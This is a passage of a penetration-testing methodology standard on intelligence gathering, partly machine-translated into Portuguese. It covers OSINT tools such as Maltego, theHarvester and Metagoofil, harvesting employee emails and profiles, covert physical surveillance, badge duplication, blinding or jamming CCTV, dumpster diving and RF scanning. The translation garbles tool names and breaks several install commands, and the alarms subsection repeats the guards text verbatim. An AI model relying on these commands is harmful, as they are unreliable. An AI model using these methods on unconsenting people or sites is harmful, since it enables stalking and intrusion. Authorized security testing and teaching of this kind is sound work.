Cree.py tem como alvo principal informações relacionadas à geolocalização sobre usuários de plataformas de redes sociais e serviços de hospedagem de imagens. A informação é apresentada em um mapa dentro do aplicativo onde todos os dados recuperados são mostrados acompanhados de informações relevantes (ou seja, o que foi postado naquele local específico) para contextualizar a apresentação.

[Interface Cree.py](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_04.png "Arquivo:Execução de teste de penetração 04.png")
### **Pegada da Internet**
A Pegada da Internet é onde tentamos reunir informações disponíveis externamente sobre a infraestrutura alvo que podemos aproveitar em fases posteriores. 
#### **Endereço de e-mail**
Coletar endereços de e-mail, embora aparentemente inúteis, pode nos fornecer informações valiosas sobre o ambiente de destino. Ele pode fornecer informações sobre possíveis convenções de nomenclatura, bem como possíveis alvos para uso posterior. Existem muitas ferramentas que podem ser usadas para coletar endereços de e-mail, como o Maltego, por exemplo. 
##### **Malta**
Paterva [Maltego](http://www.paterva.com/) é utilizado para automatizar a tarefa de coleta de informações. Maltego é um aplicativo de inteligência e análise forense de código aberto. Essencialmente, Maltego é uma ferramenta de mineração de dados e coleta de informações que mapeia as informações coletadas em um formato que pode ser facilmente compreendido e manipulado. Você economiza tempo automatizando tarefas como coleta de e-mail e mapeamento de subdomínios. A documentação do Maltego é relativamente escassa, por isso incluímos os procedimentos necessários para obter os dados solicitados. 

Depois de iniciar o Maltego, a interface principal deverá estar visível. As seis áreas principais da interface são a barra de ferramentas, a paleta, a área gráfica (visualização), a área de visão geral, a área detalhada e a área de propriedades. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_05.png "Arquivo:Execução de teste de penetração 05.png") 

Aqui está uma sugestão de fluxo de trabalho para você começar. Considere-o um exercício de treinamento e não absoluto, pois você desejará personalizar seu fluxo de trabalho dependendo do seu envolvimento.

Para começar, olhe para o canto superior esquerdo do Maltego e clique no botão “novo gráfico”. Depois disso, arraste o item “domínio” da paleta para o gráfico. A área do gráfico permite processar as transformações, bem como visualizar os dados na visualização de mineração, visualização dinâmica, visualização ponderada de borda, bem como na lista de entidades. Quando você adiciona pela primeira vez o ícone do domínio ao seu gráfico, o padrão será "paterva.com", clique duas vezes nesse ícone e altere o nome para o domínio do seu destino (sem qualquer subdomínio, como www). Agora você está pronto para começar a minerar.

1\. Clique com o botão direito (ou clique duas vezes) no ícone do domínio e em "executar transformação" selecione "Para DNS do site [usando mecanismo de pesquisa]". Esperamos que isso resulte na exibição de todos os subdomínios do seu destino. 
2\. Selecione todos os subdomínios e execute a transformação "To IP Address [DNS]". Isso deve resolver todos os subdomínios para seus respectivos endereços IP.
[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_07.png "Arquivo:Execução de teste de penetração 07.png") 
3\. A partir deste ponto, você pode escolher alguns caminhos diferentes, dependendo do tamanho do seu alvo, mas o próximo passo lógico é determinar os netblocks, então execute a transformação "To Netblock [Usando limites naturais]".

Após esse ponto, você poderá usar sua imaginação para saber para onde ir em seguida. Você poderá cultivar números de telefone, endereços de e-mail, informações de localização geográfica e muito mais usando as transformações fornecidas. A Paleta contém todas as transformações que estão disponíveis (ou ativadas) para uso. No momento em que este livro foi escrito, havia aproximadamente 72 transformações. Uma limitação da "Community Edition" do Maltego é que qualquer transformação retornará apenas 12 resultados, enquanto a versão profissional não tem nenhuma limitação.

Resista à tentação de executar "todas as transformações", pois isso provavelmente sobrecarregará você com dados e inibirá sua capacidade de detalhar os dados mais interessantes e relevantes para o seu envolvimento.   

Maltego não se limita apenas à parte de pré-engajamento do seu pentest. Você também pode importar dumps csv/xls dos resultados do airodump de volta para o Maltego para ajudá-lo a visualizar as redes. 
##### **A colheitadeira**
TheHarvester é uma ferramenta, escrita por Christian Martorella, que pode ser usada para coletar contas de e-mail e nomes de subdomínios de diferentes fontes públicas (mecanismos de busca, servidores de chave pgp). É uma ferramenta muito simples, mas muito eficaz. 

root@pentest:/pentest/enumeration/theharvester# ./theHarvester.py 

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\* \*\*\* 

\*TheHarvester Ver. 1.6 \* 

\*Codificado por Christian Martorella \* 

\*Edge-Security Research \* 

\*cmartorella@edge-security.com \* 

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\* \*\*\*\*\*\*\*\*\*\* 


Uso: opções do theharvester 

`       `-d: domínio a ser pesquisado ou nome da empresa 

`       `-b: fonte de dados (google,bing,pgp,linkedin) 

`       `-s: início no número do resultado X (padrão 0) 

`       `- v: verifica o nome do host via resolução DNS 

`       `-l: limita o número de resultados para trabalhar (o bing vai de 50 a 50 resultados, o 

`            `google 100 a 100 e o pgp não usa esta opção) 

Exemplos:./theharvester.py - d microsoft.com -l 500 -b google 

./theharvester.py -d microsoft.com -b pgp 

./theharvester.py -d microsoft -l 200 -b linkedin

TheHarvester irá pesquisar a fonte de dados especificada e retornar os resultados. Isso deve ser adicionado ao documento OSINT para uso posterior. 

root@pentest:/pentest/enumeration/theharvester# ./theHarvester.py -d client.com -b google -l 500 

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\* \*\*\*\*\*\*\*\*\*\*\*\*\*\* 

\*TheHarvester Ver. 1.6 \* 

\*Codificado por Christian Martorella \* 

\*Edge-Security Research \* 

\*cmartorella@edge-security.com \* 

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\* \*\*\*\*\*\*\*\*\*\* 

Pesquisando client.com no google: 

================================ ====== 


Limite: 500 

Resultados da pesquisa: 0 

Resultados da pesquisa: 100 

Resultados da pesquisa: 200 

Resultados da pesquisa: 300 

Resultados da pesquisa: 400 

Contas encontradas: 

=================== == 

admin@client.com 

nick@client.com 

jane@client.com 

sarah@client.com
##### **NetGlub**
NetGlub é uma ferramenta de código aberto muito semelhante ao Maltego. NetGlub é uma ferramenta de mineração de dados e coleta de informações que apresenta as informações coletadas em um formato de fácil compreensão. A documentação do NetGlub é inexistente no momento por isso estamos incluindo os procedimentos necessários para obter os dados solicitados. 

Instalar o NetGlub não é uma tarefa trivial, mas pode ser realizada executando o seguinte: 

apt-get install build-essential mysql-server libmysqlclient-dev zlib1g-dev libperl-dev libnet-ip-perl libopenssl-ruby ruby-dev ruby ​​omt php5-cli nmap libnet-dns-perl libnet-ip-perl python-dev 

wget http://pypi.python.org/packages/source/s/simplejson/simplejson-2.1.5.tar.gz 

tar -xzvf simplejson-2.1.5.tar.gz 

cd configuração simplejson-2.1.5 

python2.7. py build 

python2.7 setup.py 

CD de instalação .. 

wget http://sourceforge.net/projects/pyxml/files/pyxml/0.8.4/PyXML-0.8.4.tar.gz 

tar -xvzf PyXML-0.8.4 .tar.gz 

cd PyXML-0.8.4 

wget http://launchpadlibrarian.net/31786748/0001-Patch-for-Python-2.6.patch 

patch -p1 <0001-Patch-for-Python-2.6.patch 

configuração do python. py instalar 

cd /pentest/enumeração

Neste ponto, usaremos uma instalação GUI do QT-SDK. A principal coisa a salientar aqui é que o caminho de instalação precisa ser alterado durante a instalação para refletir /opt/qtsdk. Se você usar um caminho diferente, precisará atualizar os caminhos no script abaixo para refletir essa diferença. 

Observe que durante a instalação do QT-SDK somos lembrados das dependências externas, portanto, certifique-se de executar "apt-get install libglib2.0-dev libSM-dev libxrender-dev libfontconfig1-dev libxext-dev". 

wget http://blog.hynesim.org/ressources/install/qt-sdk-linux-x86-opensource-2010.03.bin 

chmod +x qt-sdk-linux-x86-opensource-2010.03.bin 

./qt-sdk- linux-x86-opensource-2010.03.bin 

wget http://www.graphviz.org/pub/graphviz/stable/SOURCES/graphviz-2.26.3.tar.gz 

tar -xzvf graphviz-2.26.3.tar.gz 

cd graphviz-2.26.3 

./configure 

make 

make install 

cd /pentest/enumeration 

wget http://redmine.lab.diateam.net/attachments/download/1/netglub-1.0.tar.gz 

tar -xzvf netglub-1.0.tar .gz 

mv netglub-1.0 netglub 

cd /pentest/enumeration/netglub/qng/ 

/opt/qtsdk/qt/bin/qmake 

make

Agora precisamos iniciar o MySQL e criar o banco de dados netglub 

inicie mysql 

mysql -u root -ptoor 

crie banco de dados netglub; 

use o netglub; 

crie o usuário "netglub"@"localhost"; 

definir senha para "netglub"@"localhost" = senha("netglub"); 

GRANT ALL ON netglub.\* TO "netglub"@"localhost"; 

sair 

mysql -u root -ptoor netglub < /pentest/enumeration/netglub/master/tools/sql/netglub.sql   

cd /opt/qtsdk/qt/src/plugins/sqldrivers/mysql/ 

/opt/qtsdk/qt/bin/ qmake INCLUDEPATH+=/usr/include/mysql/ 

make 

cp /opt/qtsdk/qt/src/plugins/sqldrivers/mysql/libqsqlmysql.so /opt/qtsdk/qt/plugins/sqldrivers/. 

cd /pentest/enumeration/netglub/master 

/opt/qtsdk/qt/bin/qmake 

make 

cd tools/ 

./install.sh 

cd /pentest/enumeration/netglub/slave 

/opt/qtsdk/qt/bin/qmake 

make 

cd tools / 

./install.sh 

wget http://sourceforge.net/projects/xmlrpc-c/files/Xmlrpc-c%20Super%20Stable/1.16.34/xmlrpc-c-1.16.34.tgz/download 

tar -zxvf xmlrpc -c-1.16.34.tgz 

cd xmlrpc-c-1.16.34 

./configure 

make 

make install


Depois de instalar o NetGlub, você provavelmente terá interesse em executá-lo. Este é realmente um processo de quatro etapas: Certifique-se de que o MySQL esteja rodando: 

iniciar mysql

Inicie o NetGlub Master: 

/pentest/enumeração/netglub/master/master

Inicie o escravo NetGlub: 

/pentest/enumeração/netglub/slave/slave

Inicie a GUI do NetGlub: 

/pentest/enumeração/netglub/qng/bin/unix-debug/netglub

Agora a interface principal deve estar visível. Se você conhece o Maltego, se sentirá em casa com a interface. As seis áreas principais da interface são a barra de ferramentas, a paleta, a área do gráfico (ou visualização), os detalhes e a área de propriedades. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_166.png "Arquivo:Execução de teste de penetração 166.png") 

Uma lista completa de todas as transformações disponíveis (ou ativadas) para uso. No momento em que este livro foi escrito, havia aproximadamente 33 transformações. Uma transformação é um script que realmente executará a ação em um determinado site. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_167.png "Arquivo:Execução de teste de penetração 167.png") 

A área do gráfico permite processar as transformações, bem como visualizar os dados na visualização de mineração, visualização dinâmica, visualização ponderada de borda, bem como na lista de entidades. A área de visão geral fornece um minimapa das entidades descobertas com base nas transformações. A área de detalhes é onde é possível detalhar as especificidades da entidade. É possível visualizar coisas como os relacionamentos, bem como detalhes de como as informações foram geradas. A área de propriedades permite ver as propriedades específicas da transformação preenchidas com os resultados específicos da entidade. Para começar a usar o NetGlub precisamos arrastar e soltar uma transformação da Paleta para a Área do Gráfico. Por padrão, isso será preenchido com dados fictícios. Para editar a entidade na transformação selecionada, faça isso editando as entradas na visualização de propriedades. 

Primeiro precisamos determinar a infraestrutura da Internet, como os domínios. Para fazer isso, arrastaremos e soltaremos a transformação do Domínio na área do gráfico. Edite a transformação para refletir o nome de domínio apropriado para o cliente. É possível coletar quase todos os dados que necessitaremos inicialmente clicando em Run All Transforms. 


Os dados destas entidades serão utilizados para obtenção de informação adicional. Dentro da área do gráfico os resultados serão visíveis conforme ilustrado abaixo. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_168.png "Arquivo:Execução de teste de penetração 168.png") 

Selecionando as entidades e optando por executar transformações adicionais, os dados coletados serão expandidos. Se não tiver sido usada uma transformação específica da qual você deseja coletar dados, basta arrastá-la para a área do gráfico e fazer as alterações apropriadas na visualização de propriedades. 

Haverá algumas informações que você precisará inserir para garantir que o NetGlub funcione corretamente. Por exemplo, você precisará inserir os servidores DNS que deseja consultar. Além disso, você será solicitado a fornecer suas chaves de API Alchemy e Open Calais. 

Para Alchemy, você precisará acessar <http://www.alchemyapi.com/api/register.html> para receber sua própria chave de API. Para Open Calais, você precisará acessar <http://www.opencalais.com/APIkey> para receber sua própria chave API. 
#### **Nomes de usuário/Identificadores**
Identificar nomes de usuário e identificadores associados a um e-mail específico é útil, pois pode fornecer várias informações importantes. Por exemplo, pode fornecer uma pista significativa sobre nome de usuário e senhas. Além disso, também pode indicar o interesse de um determinado indivíduo fora do trabalho. Um bom local para localizar este tipo de informação é dentro de grupos de discussão (grupos de notícias, listas de discussão, fóruns, salas de bate-papo, etc.). 
#### **Redes sociais**
- [Verificar Nomes de Usuário](http://www.checkusernames.com/) – Útil para verificar a existência de um determinado nome de usuário em 160 Redes Sociais.
##### **Grupos de notícias**
- [Google](http://www.google.com/) - [http://www.google.com](http://www.google.com/)
- [Grupos do Yahoo](http://groups.yahoo.com/) - [http://groups.yahoo.com](http://groups.yahoo.com/)
- [Fóruns Delphi ](http://www.delphiforums.com/) - [http://www.delphiforums.com](http://www.delphiforums.com/)
- [Placas grandes](http://www.big-boards.com/) - [http://www.big-boards.com](http://www.big-boards.com/)
##### **Listas de discussão**
- TILE.Net - <http://tile.net/lists>
- Topica - [http://lists.topica.com](http://lists.topica.com/)
- L-Soft CataList, the Official Catalog of LISTSERV lists - <http://www.lsoft.com/lists/listref.html>
- The Mail Archive - [http://www.mail-archive.com](http://www.mail-archive.com/)
##### **Chat Rooms**
- SearchIRC - [http://searchirc.com](http://searchirc.com/)
- Gogloom - [http://www.gogloom.com](http://www.gogloom.com/)
##### **Forums Search**
- BoardReader - [http://boardreader.com](http://boardreader.com/)
- Omgili - [http://www.omgili.com](http://www.omgili.com/)
#### **Personal Domain Names**
The ability to locate personal domains that belong to target employees can yield additional information such as potential usernames and passwords. In addition, it can also indicate a particular individual's interest outside of work. 
#### **Personal Activities**
It is not uncommon for individuals to create and publish audio files and videos. While these may be seem insignificant, they can yield additional information about a particular individual's interest outside of work. 
##### **Audio**
- iTunes - <http://www.apple.com/itunes>
- Podcast.com - [http://podcast.com](http://podcast.com/)
- Podcast Directory - [http://www.podcastdirectory.com](http://www.podcastdirectory.com/)
- Yahoo! Audio Search - [http://audio.search.yahoo.com](http://audio.search.yahoo.com/)
##### **Video**
- YouTube - [http://youtube.com](http://youtube.com/)
- Yahoo Video - [http://video.search.yahoo.com](http://video.search.yahoo.com/)
- Google Video - [http://video.google.com](http://video.google.com/)
- Bing Video - <http://www.bing.com/videos>
#### **Archived Information**
There are times when we will be unable to access web site information due to the fact that the content may no longer be available from the original source. Being able to access archived copies of this information allows access to past information. There are several ways to access this archived information. The primary means is to utilize the cached results under Google's cached results. As part of an NVA, it is not uncommon to perform Google searches using specially targeted search strings: 
cache:<site.com> 

Note: Replace <site.com> with the name of the domain that you wish to perform the search on. 

An additional resource for archived information is the Wayback Machine ([http://www.archive.org](http://www.archive.org/)). 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_09.png "Arquivo:Execução de teste de penetração 09.png") 
#### **Electronic Data**
Collection of electronic data in direct response to reconnaissance and intelligence gathering should be focused on the target business or individual. 
##### **Document leakage**
Publicly available documents should be gathered for essential data (date, time, location specific information, language, and author). Data collected could provide insight into the current environment, operational procedures, employee training, and human resources. 
##### **Metadata leakage**
A identificação de metadados é possível através de um mecanismo de busca especializado. O objetivo é identificar dados relevantes para a empresa-alvo. Pode ser possível identificar locais, hardware, software e outros dados relevantes a partir de publicações em redes sociais. Alguns mecanismos de pesquisa que oferecem a capacidade de pesquisar metadados são os seguintes: 

- ixquick - [http://ixquick.com](http://ixquick.com/)
- MetaCrawler - [http://metacrawler.com](http://metacrawler.com/)
- Dogpile - [http://www.dogpile.com](http://www.dogpile.com/)
- Search.com - [http://www.search.com](http://www.search.com/)
- Visualizador Exif de Jeffery - <http://regex.info/exif.cgi>

Além dos motores de busca, existem diversas ferramentas para coletar arquivos e reunir informações de diversos documentos. 
###### **FOCA (janelas)**
FOCA é uma ferramenta que lê metadados de uma ampla variedade de formatos de documentos e mídia. FOCA extrai nomes de usuário, caminhos, versões de software, detalhes de impressoras e endereços de e-mail relevantes. Tudo isso pode ser realizado sem a necessidade de baixar arquivos individualmente. 
###### **Foundstone SiteDigger (Windows)**
A Foundstone possui uma ferramenta, chamada SiteDigger, que nos permite pesquisar um domínio usando strings especiais do Google Hacking Database (GHDB) e do Foundstone Database (FSDB). Isso permite um pouco mais de 1.640 consultas potenciais disponíveis para descobrir informações adicionais.
[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_10.png "Arquivo:Execução de teste de penetração 10.png") 

As consultas específicas verificadas, bem como os resultados das consultas são mostrados. Para acessar os resultados de uma consulta, basta clicar duas vezes no link fornecido para abrir em um navegador. 
###### **Metagoofil (Linux/Windows)**
Metagoofil é uma ferramenta de coleta de informações baseada em Linux projetada para extrair metadados de documentos públicos (.pdf, .doc, .xls, .ppt, .odp, .ods) disponíveis nos sites dos clientes. 

O Metagoofil gera uma página de resultados em HTML com os resultados dos metadados extraídos, além de uma lista de possíveis nomes de usuário que podem ser úteis para ataques de força bruta. Ele também extrai caminhos e informações de endereço MAC dos metadados. 

Metagoofil tem algumas opções disponíveis, mas a maioria está relacionada ao que você deseja atingir especificamente, bem como ao número de resultados desejados. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_11.png "Arquivo:Execução de teste de penetração 11.png") 

O comando para executar *o metagoofil* é o seguinte: 

metagoofil.py -d <domínio do cliente> -l 100 -f all -o <domínio do cliente>.html -t microarquivos
###### **Leitor Exif (Windows)**
Exif Reader é um software de análise de arquivos de imagem para Windows. Ele analisa e exibe a velocidade do obturador, a condição do flash, a distância focal e outras informações de imagem incluídas no formato de imagem Exif, que é suportado por quase todas as câmeras digitais mais recentes. Arquivos de imagem Exif com extensão JPG podem ser tratados da mesma maneira que arquivos JPEG convencionais. Este software analisa arquivos JPEG criados por câmeras digitais e pode ser baixado em <http://www.takenet.or.jp/~ryuuji/minisoft/exifread/english> . 
###### **ExifTool (Windows/OS X)**
Exif Tool é uma ferramenta do Windows e OS X para leitura de informações Meta. ExifTool oferece suporte a uma ampla variedade de formatos de arquivo. ExifTool pode ser baixado em <http://www.sno.phy.queensu.ca/~phil/exiftool> . 
###### **Pesquisa de imagem**
Embora não esteja diretamente relacionado aos metadados, o Tineye também é útil: <http://www.tineye.com/> Se for encontrado um perfil que inclua uma foto, mas não um nome real, o Tineye às vezes pode ser usado para encontrar outros perfis na Internet que pode conter mais informações sobre uma pessoa (incluindo sites de relacionamento). 
### **Reunião secreta**
#### **Reunião no local**
As visitas no local também permitem que o pessoal de avaliação observe e recolha informações sobre a segurança física, ambiental e operacional do alvo. 
##### **Instalações Adjacentes**
Uma vez identificadas as localizações físicas, é útil identificar as instalações adjacentes. As instalações adjacentes devem ser documentadas e, se possível, incluir quaisquer instalações ou serviços partilhados observados. 
##### **Inspeções de segurança física**
Inspeções secretas de segurança física são usadas para verificar a postura de segurança do alvo. Estas são conduzidas de forma encoberta, clandestina e sem que nenhuma das partes saiba que estão sendo inspecionadas. A observação é o componente chave desta atividade. As medidas de segurança física que devem ser observadas incluem equipamentos, procedimentos ou dispositivos de segurança física usados ​​para proteger contra possíveis ameaças. Uma inspeção de segurança física deve incluir, mas não está limitada ao seguinte: 
###### **Seguranças**
A observação dos guardas de segurança (ou do agente de segurança) é muitas vezes o primeiro passo para avaliar a dissuasão mais visível. Os guardas de segurança estão uniformizados e atuam para proteger a propriedade, mantendo uma presença de alta visibilidade para impedir ações ilegais e inadequadas. Ao observar diretamente os movimentos dos guardas de segurança é possível determinar os procedimentos em uso ou estabelecer padrões de movimento. Você precisará observar o que os seguranças estão protegendo. É possível utilizar binóculos para observar qualquer movimento a uma distância segura. 

Alguns guardas de segurança são treinados e licenciados para portar armas de fogo para sua própria segurança e do pessoal que estão encarregados de proteger. O uso de armas de fogo pelos seguranças não deveria ser uma surpresa, se observado. Isto deve ser documentado antes do início do trabalho. Se forem observadas armas de fogo, certifique-se de tomar precauções para não tomar qualquer ação adicional, a menos que seja especificamente autorizado e treinado para fazê-lo. 
###### **Uso do emblema**
O uso de crachás refere-se a um método de segurança física que envolve o uso de crachás de identificação como forma de controle de acesso. Os sistemas de crachás podem ser vinculados a um sistema de controle de acesso físico ou simplesmente usados ​​como um mecanismo de validação visual. É importante documentar o uso individual do crachá. Ao observar o uso do crachá, pode ser possível duplicar o crachá específico que está sendo utilizado. Os itens específicos que devem ser observados são se o crachá deve estar visível ou mostrado para obter acesso físico à propriedade ou instalação. O uso do crachá deve ser documentado e, se possível, incluir procedimentos de validação observados. 
###### **Dispositivos de bloqueio**
Um dispositivo de travamento é um mecanismo mecânico ou eletrônico frequentemente implementado para impedir entrada ou saída não autorizada. Eles podem ser tão simples como uma fechadura de porta, uma fechadura ou complexos como uma fechadura cifrada. Observando o tipo e localização dos dispositivos de travamento nas portas é possível determinar se a porta é utilizada principalmente para entrada ou saída. Você precisará observar o que os dispositivos de travamento estão protegendo. Todas as observações devem ser documentadas previamente e, se possível, tiradas fotografias. 
###### **Sistemas de detecção de intrusão (IDS)/Alarmes**
A observação dos guardas de segurança (ou do agente de segurança) é muitas vezes o primeiro passo para avaliar a dissuasão mais visível. Os guardas de segurança estão uniformizados e atuam para proteger a propriedade, mantendo uma presença de alta visibilidade para impedir ações ilegais e inadequadas. Ao observar diretamente os movimentos dos guardas de segurança é possível determinar os procedimentos em uso ou estabelecer padrões de movimento. Você precisará observar o que os seguranças estão protegendo. É possível utilizar binóculos para observar qualquer movimento a uma distância segura. 

Alguns guardas de segurança são treinados e licenciados para portar armas de fogo para sua própria segurança e do pessoal que estão encarregados de proteger. O uso de armas de fogo pelos seguranças não deveria ser uma surpresa, se observado. Isto deve ser documentado antes do início do trabalho. Se forem observadas armas de fogo, certifique-se de tomar precauções para não tomar qualquer ação adicional, a menos que seja especificamente autorizado e treinado para fazê-lo. 
###### **Iluminação de segurança**
A iluminação de segurança é frequentemente usada como medida preventiva e corretiva em uma propriedade física. A iluminação de segurança pode ajudar na detecção de intrusos, actuar como dissuasão para intrusos ou, em alguns casos, simplesmente para aumentar a sensação de segurança. A iluminação de segurança é frequentemente um componente integral do projeto ambiental de uma instalação. A iluminação de segurança inclui holofotes e luzes de vapor de sódio de baixa pressão. A maior parte da iluminação de segurança que deve ser deixada acesa a noite toda é do tipo lâmpada de descarga de alta intensidade. Outras luzes podem ser ativadas por sensores, como sensores infravermelhos passivos (PIRs), acendendo apenas quando uma pessoa (ou outro mamífero) se aproxima. As lâmpadas ativadas por PIR geralmente são lâmpadas incandescentes para que possam ser ativadas instantaneamente; a economia de energia é menos importante, pois eles não estarão ligados o tempo todo. A ativação do sensor PIR pode aumentar tanto o efeito dissuasor (já que o intruso sabe que foi detectado) quanto o efeito de detecção (já que uma pessoa será atraída pelo aumento repentino de luz). Algumas unidades PIR podem ser configuradas para emitir um sinal sonoro e também para acender a luz. A maioria das unidades modernas possui fotocélula para que só liguem quando estiver escuro. 

Embora a iluminação adequada em torno de uma estrutura física seja implantada para reduzir o risco de uma intrusão, é fundamental que a iluminação seja implementada adequadamente, pois a iluminação mal organizada pode, na verdade, obstruir a visualização da instalação que foi projetada para proteger. 

Security lighting may be subject to vandalism, possibly to reduce its effectiveness for a subsequent intrusion attempt. Thus security lights should either be mounted very high, or else protected by wire mesh or tough polycarbonate shields. Other lamps may be completely recessed from view and access, with the light directed out through a light pipe, or reflected from a polished aluminum or stainless steel mirror. For similar reasons high security installations may provide a stand-by power supply for their security lighting. Observe and document the type, number, and locations of security lighting in use. 
###### **Surveillance /CCTV systems**
Surveillance/CCTV systems may be used to observe activities in and around a facility from a centralized area. Surveillance/CCTV systems may operate continuously or only when activated as required to monitor a particular event. More advanced Surveillance/CCTV systems utilize motion-detection devices to activate the system. IP-based Surveillance/CCTV cameras may be implemented for a more decentralized operation. 

Surveillance/CCTV cameras can be of a conspicuous nature, which are used as a visible deterrence, as well as an inconspicuous nature. Surveillance/CCTV cameras are generally small high definition color cameras that can not only focus to resolve minute detail, but by linking the control of the cameras to a computer, objects can be tracked semi-automatically. Observing and documenting the Surveillance/CCTV system is critical for identifying the areas of coverage. While it might not be possible to determine the specific camera type being utilized or even the area of coverage it is possible to identify areas with or without limited coverage. It should be noted if the Surveillance/CCTV system is physically protected. If not, then it needs to be documented if the Surveillance/CCTV camera is vulnerable to someone deliberately destroying it. Additionally, a physically unprotected camera may be subject to blurring or blocking the image by spraying substances or obstructing the lens. Lasers can be used to blind or damage Surveillance/CCTV cameras. For wireless Surveillance/CCTV systems, broadcasting a signal at the same frequency as the wireless equipment could make it subject to jamming. 
###### **Access control devices**
Access control devices enable access control to areas and/or resources in a given facility. Access control refers to the practice of restricting entrance to a property, a building, or a room to authorized persons. Access control can be achieved by a human (a security guard, or receptionist), through mechanical means such as locks and keys, or through technological means such as access control systems like the Access control vestibule. 

Access control devices historically were accomplished through keys and locks. Electronic access control use is widely being implemented to replace mechanical keys. Access control readers are generally classified as Basic, Semi-intelligent, and Intelligent. A basic access control reader simply reads a card number or PIN and forward it to a control panel. The most popular type of access control readers are RF Tiny by RFLOGICS, ProxPoint by HID, and P300 by Farpointe Data. Semi-intelligent readers have inputs and outputs necessary to control door hardware (lock, door contact, exit button), but do not make any access decisions. Common Semi-intelligent readers are InfoProx Lite IPL200 by CEM Systems and AP-510 by Apollo. Intelligent readers have all the inputs and outputs necessary to control door hardware while having the memory and the processing power necessary to make access decisions independently of each other. Common Intelligent readers are the InfoProx IPO200 by CEM Systems, AP-500 by Apollo, PowerNet IP Reader by Isonas Security Systems, ID08 by Solus has the built in web service to make it user friendly, Edge ER40 reader by HID Global, LogLock and UNiLOCK by ASPiSYS Ltd, and BioEntry Plus reader by Suprema Inc. 

Some readers may have additional features such as an LCD and function buttons for data collection purposes (i.e. clock-in/clock-out events for attendance reports), camera/speaker/microphone for intercom, and smart card read/write support. Observe and document the type, number, and locations of access control devices in use. 
###### **Environmental Design**
Environmental design involves the surrounding environmental of a building, or facility. In the scope of Physical security, environmental design includes facilities geography, landscape, architecture, and exterior design. 

Observing the facilities and surrounding areas can highlight potential areas of concern such as potential obscured areas due to geography and landscaping. Architecture and exterior design can impact the ability of security guards to protect property by creating areas of low or no-visibility. In addition, the placement of fences, storage containers, security guard shacks, barricades and maintenance areas could also prove useful in the ability move around a facility in a covert manner. 
##### **Employee Behavior**
Observing employees is often the one of the easier steps to perform. Employee actions generally provide insight into any corporate behaviors or acceptable norms. By observing, employees it is possible to determine procedures in use or establish ingress and egress traffic patterns. It is possible to utilize binoculars to observe any movement from a safe distance. 
##### **Dumpster diving**
Traditionally, most targets dispose of their trash in either garbage cans or dumpsters. These may or may not be separated based upon the recyclability of the material. The act of dumpster diving is the practice of sifting through commercial or residential trash to find items that have been discarded by their owners, but which may be useful. This is often times an extremely dirty process that can yield significant results. Dumpsters are usually located on private premises and therefore may subject the assessment team to potentially trespassing on property not owned by the target. Though the law is enforced with varying degrees of rigor, ensure that this is authorized as part of the engagement. Dumpster diving per se is often legal when not specifically prohibited by law. Rather than take the refuse from the area, it is commonly accepted to simply photograph the obtained material and then return it to the original dumpster. 
##### **RF / Wireless Frequency scanning**
A band is a section of the spectrum of radio communication frequencies, in which channels are usually used or set aside for the same purpose. To prevent interference and allow for efficient use of the radio spectrum, similar services are allocated in bands of non-overlapping ranges of frequencies. 

As a matter of convention, bands are divided at wavelengths of 10<sup>n</sup> meters, or frequencies of 3?10<sup>n</sup> hertz. For example, 30 MHz or 10 m divides shortwave (lower and longer) from VHF (shorter and higher). These are the parts of the radio spectrum, and not its frequency allocation. 

Each of these bands has a basic band plan which dictates how it is to be used and shared, to avoid interference, and to set protocol for the compatibility of transmitters and receivers. Within the US, band plans are allocated and controlled by the Federal Communications Commission (FCC). The chart below illustrates the current band plans. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_12.png "Arquivo:Execução de teste de penetração 12.png")

To avoid confusion, there are two bands that we could focus on our efforts on. The band plans that would in of interest to an attacker are indicated in the following chart. 

|**Band name**|**Abbr**|**ITU band**|**Frequency and wavelength in air**|**Example uses**|
| :-: | :-: | :-: | :-: | :-: |
|Very high frequency |VHF |8 |30-300 MHz<br>10 m - 1 m |FM, television broadcasts and line-of-sight ground-to-aircraft and aircraft-to-aircraft communications. Land Mobile and Maritime Mobile communications, amateur radio, weather radio |
|Ultra high frequency |UHF |9 |300-3000 MHz<br>1 m - 100 mm |Television broadcasts, microwave ovens, mobile phones, wireless LAN, Bluetooth, ZigBee, GPS and two-way radios such as Land Mobile, FRS and GMRS radios, amateur radio |

A Radio Frequency (RF) site survey or wireless survey, sometimes called a wireless site survey, is the process of determining the frequencies in use within a given environment. When conducting a RF site survey, it's very important to identify an effective range boundary, which involves determining the SNR at various points around a facility. 

To expedite the process, all frequencies in use should be determined prior to arrival. Particular attention should be paid to security guards, and frequencies that the target is licensed to use. Several resources exist to assist in acquiring this information: 

|**Site**|**URL**|**Description**|
| :- | :- | :- |
|Radio Reference |<http://www.radioreference.com/apps/db/>|Free part of the site containing a wealth of information |
|National Radio Data |<http://www.nationalradiodata.com/>|FCC database search / $29 year|
|Percon Corp |[http://www.perconcorp.com](http://www.perconcorp.com/)|FCC database search / Paid site - custom rates|

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_13.png "Arquivo:Execução de teste de penetração 13.png")

At a minimum a search engine (Google, Bing, and Yahoo!) should be utilized to conduct the following searches: 

- "Target Company" scanner
- "Target Company" frequency
- "Target Company" guard frequency
- "Target Company" MHz
- Press releases from radio manufactures and reseller regarding the target
- Press releases from guard outsourcing companies talking about contracts with the target company
#### **Frequency Usage**
